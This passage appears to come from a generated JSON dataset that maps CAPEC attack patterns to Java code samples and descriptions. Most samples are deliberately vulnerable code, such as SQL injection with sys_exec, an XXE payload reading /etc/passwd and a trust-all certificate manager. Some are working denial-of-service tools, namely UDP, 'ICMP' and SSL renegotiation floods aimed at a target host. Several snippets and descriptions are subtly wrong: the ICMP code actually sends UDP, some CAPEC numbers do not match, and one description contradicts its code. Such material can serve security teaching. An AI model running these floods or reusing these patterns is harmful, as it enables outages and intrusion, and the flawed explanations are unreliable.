        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CSSInjectionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String cssUrl = request.getParameter(\"cssUrl\");\n        if (cssUrl != null && !cssUrl.isEmpty()) {\n            // Vulnerable to CSS Injection\n            response.setContentType(\"text/css\");\n            response.getWriter().write(\"@import url('\" + cssUrl + \"');\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Generic Cross-Browser Cross-Domain Theft via CSS injection. The servlet takes a 'cssUrl' parameter from the request and directly includes it in the response as a CSS import statement. This is dangerous because it allows an attacker to inject a malicious CSS URL, which can lead to cross-domain data theft. The code does not properly neutralize the input (CWE-79), does not ensure the input is well-formed (CWE-707), and does not handle URL encoding properly (CWE-177). This example highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Simulate resource allocation without limits\n        while (true) {\n            // Keep the connection open indefinitely\n            response.getWriter().write(\"Holding connection open...\");\n            response.getWriter().flush();\n            try {\n                Thread.sleep(1000); // Sleep to simulate delay\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to an HTTP DoS attack by keeping the HTTP session alive indefinitely. The `doGet` method enters an infinite loop, continuously writing to the response and flushing the output stream, which keeps the connection open. This simulates the resource allocation without limits (CWE-770) and insufficient resource pool (CWE-410) weaknesses. An attacker could exploit this by opening multiple connections to the servlet, causing resource exhaustion on the server and leading to a denial of service for legitimate users."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableDatabaseAccess {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated user input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\");\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Dangerous: Executing a system command from the database\n            String osCommand = \"ls -la\";\n            stmt.execute(\"CALL sys_exec('\" + osCommand + \"')\");\n\n            // Dangerous: Creating a user-defined function that can call system-level libraries\n            stmt.execute(\"CREATE FUNCTION sys_exec RETURNS STRING SONAME 'libc.so.6';\");\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable database access scenario that embodies the main idea of the CAPEC 'Expanding Control over the Operating System from the Database'. The code includes several CWE-related vulnerabilities:\n\n1. **SQL Injection (CWE-89)**: The user input is directly concatenated into the SQL query without proper sanitization, allowing an attacker to manipulate the SQL command.\n2. **Execution with Unnecessary Privileges (CWE-250)**: The database connection is made with root privileges, which is higher than necessary and can amplify the impact of other vulnerabilities.\n3. **Dangling Database Cursor (CWE-619)**: The code does not properly close the database cursor, potentially leaving it accessible to other users.\n4. **System Command Execution**: The code demonstrates executing a system command from the database and creating a user-defined function that can call system-level libraries, which can lead to full control over the host operating system.\n\nThis snippet highlights how an attacker can leverage SQL injection to gain unauthorized access and execute arbitrary commands on the host machine, thereby compromising the entire system."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.util.List;\n\npublic class SearchOrderHijackingExample {\n    public static void main(String[] args) {\n        try {\n            // Simulate loading a library from the current directory\n            String libraryName = \"exampleLibrary.dll\";\n            Path currentDir = Paths.get(\"\");\n            Path libraryPath = currentDir.resolve(libraryName);\n\n            // Check if the library exists in the current directory\n            if (Files.exists(libraryPath)) {\n                System.load(libraryPath.toString());\n                System.out.println(\"Loaded library from: \" + libraryPath.toString());\n            } else {\n                // Fallback to system library path\n                System.loadLibrary(libraryName);\n                System.out.println(\"Loaded library from system path\");\n            }\n        } catch (UnsatisfiedLinkError e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to Search Order Hijacking. The code attempts to load a library named 'exampleLibrary.dll' from the current directory first. If the library is not found in the current directory, it falls back to loading the library from the system path. This behavior can be exploited by an attacker who places a malicious 'exampleLibrary.dll' in the current directory, causing the application to load the rogue library instead of the legitimate one. This example embodies the main idea of CAPEC-471 (Search Order Hijacking) and is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path)."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class BrowserFingerprintingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String browserInfo = getBrowserInfo(userAgent);\n\n        // Vulnerable: Exposing sensitive information in the query string\n        response.sendRedirect(\"/exploit?browser=\" + browserInfo);\n    }\n\n    private String getBrowserInfo(String userAgent) {\n        if (userAgent.contains(\"Chrome\")) {\n            return \"Chrome\";\n        } else if (userAgent.contains(\"Firefox\")) {\n            return \"Firefox\";\n        } else if (userAgent.contains(\"MSIE\")) {\n            return \"Internet Explorer\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a basic form of browser fingerprinting by extracting the 'User-Agent' header from the HTTP request to determine the browser type. The 'getBrowserInfo' method checks the 'User-Agent' string for known browser identifiers and returns the browser name. The servlet then redirects the user to an '/exploit' endpoint, appending the browser information as a query parameter. This approach is vulnerable to several issues: it exposes sensitive information (CWE-200), uses GET requests with sensitive data in the query string (CWE-598), and could be exploited for cross-site scripting (CWE-79) if the 'User-Agent' string is not properly sanitized."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class SignatureSpoofExample {\n    public static void main(String[] args) {\n        String message = \"Important message\";\n        String fakeSignature = generateFakeSignature(message);\n        if (verifySignature(message, fakeSignature)) {\n            System.out.println(\"Message is from a trusted source.\");\n        } else {\n            System.out.println(\"Message is not from a trusted source.\");\n        }\n    }\n\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static String generateFakeSignature(String message) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // MD5 is considered broken\n            byte[] digest = md.digest(message.getBytes());\n            return Base64.getEncoder().encodeToString(digest);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    // CWE-290: Authentication Bypass by Spoofing\n    private static boolean verifySignature(String message, String signature) {\n        // Improper verification logic\n        return signature.equals(generateFakeSignature(message));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of message signing and verification, embodying the 'Signature Spoof' CAPEC. The code uses MD5, a broken cryptographic algorithm (CWE-327), to generate a fake signature for a message. The verification function improperly validates the signature (CWE-290), allowing an attacker to spoof the signature and trick the system into believing the message is from a trusted source. This example highlights the risks of using weak cryptographic algorithms and improper input validation in authentication mechanisms."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    private static PrivateKey stolenPrivateKey;\n    private static PublicKey publicKey;\n\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        stolenPrivateKey = pair.getPrivate();\n        publicKey = pair.getPublic();\n\n        // Sign data with the stolen private key\n        String data = \"Sensitive data\";\n        String signature = signData(data, stolenPrivateKey);\n\n        // Verify the signature with the public key\n        boolean isVerified = verifySignature(data, signature, publicKey);\n        System.out.println(\"Signature verified: \" + isVerified);\n    }\n\n    private static String signData(String data, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        return Base64.getEncoder().encodeToString(signedData);\n    }\n\n    private static boolean verifySignature(String data, String signature, PublicKey publicKey) throws Exception {\n        Signature sig = Signature.getInstance(\"SHA256withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data.getBytes());\n        byte[] signedData = Base64.getDecoder().decode(signature);\n        return sig.verify(signedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of 'Signature Spoofing by Key Theft'. The code generates a key pair, simulates the theft of the private key, and uses it to sign data. The signed data is then verified using the corresponding public key. The main idea is to show how an attacker can misuse a stolen private key to create a valid signature, misleading the victim into believing the data is authentic. This example also touches on CWE-522 (Insufficiently Protected Credentials) by implying the private key was stolen, and CWE-322 (Key Exchange without Entity Authentication) by not verifying the identity of the key owner."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey publicKey = keyPair.getPublic();\n\n        // Create a signature\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String data = \"Sensitive Data\";\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n\n        // Verify the signature (vulnerable part)\n        Signature signatureVerify = Signature.getInstance(\"SHA256withRSA\");\n        signatureVerify.initVerify(publicKey);\n        signatureVerify.update(data.getBytes());\n        boolean isValid = signatureVerify.verify(Base64.getDecoder().decode(signedData)); // Improper verification\n\n        System.out.println(\"Signature valid: \" + isValid);\n    }\n}",
        "description": "This Java code snippet demonstrates a cryptographic signature generation and verification process. The code generates a key pair, signs a piece of data using the private key, and then attempts to verify the signature using the public key. The vulnerability lies in the improper verification of the cryptographic signature, where the `verify` method incorrectly decodes the signed data using Base64, which can lead to signature spoofing. This embodies the main idea of CAPEC-347 (Signature Spoofing by Improper Validation) and is related to CWE-347 (Improper Verification of Cryptographic Signature) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import java.security.Signature;\nimport java.security.PublicKey;\nimport java.util.Base64;\n\npublic class SignatureVerification {\n    public static boolean verifySignature(String data, String signature, PublicKey publicKey) {\n        try {\n            Signature sig = Signature.getInstance(\"SHA256withRSA\");\n            sig.initVerify(publicKey);\n            sig.update(data.getBytes());\n            byte[] signatureBytes = Base64.getDecoder().decode(signature);\n            return sig.verify(signatureBytes);\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        String data = \"Important data\";\n        String fakeSignature = \"FakeSignatureBase64\";\n        PublicKey publicKey = getPublicKey(); // Assume this method retrieves the correct public key\n\n        if (verifySignature(data, fakeSignature, publicKey)) {\n            System.out.println(\"Signature is valid.\");\n        } else {\n            System.out.println(\"Signature is invalid.\");\n        }\n    }\n\n    private static PublicKey getPublicKey() {\n        // Dummy method to simulate public key retrieval\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of signature verification, which is vulnerable to signature spoofing by misrepresentation. The `verifySignature` method attempts to verify a cryptographic signature using a public key. However, the code does not include proper handling for cases where the public key might be spoofed or the signature might be tampered with. The `getPublicKey` method is a placeholder and does not actually retrieve a valid public key, which represents CWE-290 (Authentication Bypass by Spoofing) and CWE-347 (Improper Verification of Cryptographic Signature). The code also lacks proper integrity checks during transmission, aligning with CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). This snippet highlights the potential for an attacker to misrepresent a signature, leading to compromised security."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Create a signature\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String signedData = \"This is signed data.\";\n        signature.update(signedData.getBytes());\n        byte[] signedBytes = signature.sign();\n        String signedString = Base64.getEncoder().encodeToString(signedBytes);\n\n        // Unsigned data\n        String unsignedData = \"This is unsigned data.\";\n\n        // Mix signed and unsigned data\n        String mixedData = signedString + unsignedData;\n\n        // Verify the signature (incorrectly, as it will only verify the signed part)\n        signature.initVerify(publicKey);\n        signature.update(mixedData.getBytes());\n        boolean isVerified = signature.verify(Base64.getDecoder().decode(signedString));\n\n        System.out.println(\"Is the mixed data verified? \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where signed and unsigned data are mixed, leading to potential signature spoofing. The code generates a key pair and signs a piece of data. It then creates a mixed string containing both signed and unsigned data. When verifying the signature, it incorrectly processes the mixed data, leading to a false sense of security. This example embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Protection Mechanism Failure' (CWE-693). The code fails to properly distinguish between signed and unsigned content, allowing an attacker to exploit this weakness."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class ModifyWindowsServiceConfig {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"C:\\\\Windows\\\\System32\\\\service.exe\";\n        String maliciousBinaryPath = \"C:\\\\malicious.exe\";\n\n        try {\n            // Improper Access Control: No validation of user permissions\n            Set<PosixFilePermission> permissions = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(Paths.get(serviceConfigPath), permissions);\n\n            // External Control of System or Configuration Setting\n            Files.copy(Paths.get(maliciousBinaryPath), Paths.get(serviceConfigPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n\n            System.out.println(\"Service configuration modified to execute malicious binary.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify the configuration of a Windows service to execute a malicious binary. The code does not validate user permissions (CWE-284: Improper Access Control), allowing unauthorized modification of the service executable. It also allows external control of the system configuration (CWE-15: External Control of System or Configuration Setting) by replacing the legitimate service binary with a malicious one. This represents the main idea of CAPEC-550: Modification of Windows Service Configuration."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.X509TrustManager;\n\npublic class VulnerableTrustManager implements X509TrustManager {\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        // Trust all client certificates\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        // Trust all server certificates\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return new X509Certificate[0];\n    }\n\n    public static void main(String[] args) {\n        // Example usage of the vulnerable trust manager\n        javax.net.ssl.SSLContext sslContext;\n        try {\n            sslContext = javax.net.ssl.SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new X509TrustManager[]{new VulnerableTrustManager()}, new java.security.SecureRandom());\n            javax.net.ssl.HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of an X509TrustManager that trusts all client and server certificates without proper validation. This is an example of CWE-295 (Improper Certificate Validation) and CWE-296 (Improper Following of a Certificate's Chain of Trust). The `checkClientTrusted` and `checkServerTrusted` methods are overridden to trust all certificates, which can be exploited by an adversary to install a malicious root certificate on a compromised system. This allows the adversary to avoid security warnings and spoof legitimate websites, capturing sensitive information such as login credentials."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VirtualizationEscape {\n    public static void main(String[] args) {\n        try {\n            // Simulate a virtualized environment by running a command in a sandbox\n            Process process = Runtime.getRuntime().exec(\"sandboxed_command\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // Vulnerability: Improper isolation allows escape from the sandbox\n            // Execute a command on the host system\n            Process hostProcess = Runtime.getRuntime().exec(\"host_command\");\n            BufferedReader hostReader = new BufferedReader(new InputStreamReader(hostProcess.getInputStream()));\n            while ((line = hostReader.readLine()) != null) {\n                System.out.println(line);\n            }\n            hostReader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can escape from a virtualized environment (sandbox) and execute commands on the host system. The code first runs a command within a simulated sandbox environment. Due to improper isolation (CWE-653), the attacker can then execute another command directly on the host system, representing a failure in the protection mechanism (CWE-693). This escape from the virtualized environment to the host system embodies the main idea of the CAPEC 'Escaping Virtualization'."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class DomainFrontingExample {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"https://example.com/resource\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        // Set the SNI field to a different domain\n        connection.setRequestProperty(\"Host\", \"malicious.com\");\n\n        // Set the Host header to the intended domain\n        connection.setRequestProperty(\"Host\", \"example.com\");\n\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of the 'Contradictory Destinations in Traffic Routing Schemes' vulnerability, specifically using the Domain Fronting technique. The code sets up an HTTP connection to 'https://example.com/resource' but manipulates the headers to create a contradiction. The SNI field (implicitly set by the URL) points to 'example.com', while the Host header is explicitly set to 'malicious.com'. This can cause traffic to be routed incorrectly, potentially leading to security issues such as data interception or unauthorized access. This example embodies CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class VulnerableTCPFloodServer {\n    private static final int PORT = 8080;\n    private static final int MAX_CONNECTIONS = 1000; // CWE-770: No limit on connections\n    private static final ExecutorService threadPool = Executors.newFixedThreadPool(MAX_CONNECTIONS);\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                threadPool.execute(() -> handleClient(clientSocket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // CWE-319: Cleartext transmission of sensitive information\n            clientSocket.getOutputStream().write(\"Welcome to the server!\".getBytes());\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet represents a vulnerable TCP server that is susceptible to a TCP flood attack. The server listens on port 8080 and uses a thread pool to handle incoming connections. However, it does not impose any restrictions on the number of connections (CWE-770), making it vulnerable to resource exhaustion attacks. Additionally, the server transmits a welcome message in cleartext (CWE-319), which can be intercepted by unauthorized actors. This code embodies the main idea of the CAPEC by demonstrating how an adversary can exploit the lack of resource limits and cleartext transmission to deny legitimate users access to the service."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.Validator;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class VulnerableXMLParser {\n    public static void main(String[] args) {\n        String xmlInput = \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\";\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xmlInput)));\n            System.out.println(\"Parsed XML: \" + doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable XML parser that is susceptible to XML External Entity (XXE) attacks. The code attempts to parse an XML input that includes an external entity reference to a local file. The DocumentBuilderFactory is configured with secure processing, but it does not disable external entity resolution, making it vulnerable to XXE attacks (CWE-611). The code also lacks proper XML schema validation (CWE-112), which could prevent malformed or malicious XML from being processed. This example embodies the main idea of the deprecated CAPEC-230 and CAPEC-231, highlighting the risks of processing untrusted XML without proper validation and security measures."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.Signature;\nimport java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class SignatureSpoofing {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair using a predictable random number generator\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        SecureRandom predictableRandom = new SecureRandom(new byte[]{0x00, 0x01, 0x02, 0x03}); // CWE-330, CWE-1241\n        keyGen.initialize(2048, predictableRandom);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Sign a message\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        String message = \"This is a secret message\";\n        signature.update(message.getBytes());\n        byte[] signedMessage = signature.sign();\n        String encodedSignature = Base64.getEncoder().encodeToString(signedMessage);\n\n        System.out.println(\"Signed Message: \" + encodedSignature);\n\n        // An attacker who can predict the random number generator can recreate the key pair\n        KeyPair attackerKeyPair = keyGen.generateKeyPair();\n        PrivateKey attackerPrivateKey = attackerKeyPair.getPrivate();\n\n        // Attacker signs a new message\n        signature.initSign(attackerPrivateKey);\n        String forgedMessage = \"This is a forged message\";\n        signature.update(forgedMessage.getBytes());\n        byte[] forgedSignedMessage = signature.sign();\n        String encodedForgedSignature = Base64.getEncoder().encodeToString(forgedSignedMessage);\n\n        System.out.println(\"Forged Signed Message: \" + encodedForgedSignature);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can recreate a private signature key by exploiting a predictable random number generator (CWE-330, CWE-1241). The code first generates a key pair using a predictable random number generator and signs a message. An attacker who can predict the random number generator can recreate the same key pair and use it to sign a forged message. This represents the main idea of CAPEC 'Signature Spoofing by Key Recreation', where the attacker misleads the victim by forging signatures from an authoritative signer."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        if (args.length < 3) {\n            System.out.println(\"Usage: java UDPFlood <target_ip> <target_port> <message>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int targetPort = Integer.parseInt(args[1]);\n        String message = args[2];\n\n        InetAddress targetAddress = InetAddress.getByName(targetIp);\n        byte[] buffer = message.getBytes();\n\n        DatagramSocket socket = new DatagramSocket();\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP flood attack. The program sends a continuous stream of UDP packets to a specified target IP address and port, using a message provided as an argument. This can overwhelm the target's network bandwidth and resources, potentially leading to a denial of service (DoS). The code does not implement any resource allocation limits (CWE-770), does not verify the destination (CWE-941), and does not control the volume of network messages (CWE-406). This example highlights the vulnerabilities and potential misuse of the UDP protocol as described in the CAPEC."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPFlood {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java ICMPFlood <target IP> <number of packets>\");\n            return;\n        }\n\n        String targetIP = args[0];\n        int numPackets = Integer.parseInt(args[1]);\n        byte[] buffer = new byte[32]; // ICMP packet size\n        InetAddress targetAddress = InetAddress.getByName(targetIP);\n        DatagramSocket socket = new DatagramSocket();\n\n        for (int i = 0; i < numPackets; i++) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);\n            socket.send(packet);\n        }\n\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple ICMP flood attack. The program sends a specified number of ICMP packets to a target IP address. The code does not implement any resource allocation limits or throttling (CWE-770), making it easy to overwhelm the target's network bandwidth. Additionally, the code does not verify the destination address (CWE-941) or restrict communication to intended endpoints (CWE-923), which can lead to unintended consequences. The code also does not handle sensitive information securely (CWE-319) or manage assertions (CWE-617), but these aspects are less relevant to the ICMP flood context."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No rate limiting or resource allocation limits\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        // Processing sensitive data in GET request\n        response.getWriter().append(\"Processed: \").append(sensitiveData);\n    }\n}",
        "description": "This Java servlet code represents a vulnerable endpoint that can be exploited by an HTTP Flood attack. The servlet processes HTTP GET requests without any rate limiting or resource allocation limits (CWE-770). It also includes sensitive information in the query string of the GET request (CWE-598). The lack of resource management can lead to an insufficient resource pool (CWE-410), making the application susceptible to denial of service attacks. The code demonstrates how an adversary can exploit these weaknesses to consume server resources and deny legitimate users access to the service."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "import javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.SSLSocket;\nimport java.io.IOException;\nimport java.net.InetAddress;\n\npublic class SSLFloodAttack {\n    public static void main(String[] args) throws IOException {\n        String host = \"example.com\";\n        int port = 443;\n        int numberOfConnections = 1000; // CWE-770: No limit on the number of connections\n\n        for (int i = 0; i < numberOfConnections; i++) {\n            new Thread(() -> {\n                try {\n                    SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n                    SSLSocket socket = (SSLSocket) factory.createSocket(InetAddress.getByName(host), port);\n                    socket.startHandshake(); // Initiate SSL handshake\n                    // CWE-400: Uncontrolled resource consumption\n                    while (true) {\n                        socket.startHandshake(); // Repeatedly renegotiate SSL connection\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n}",
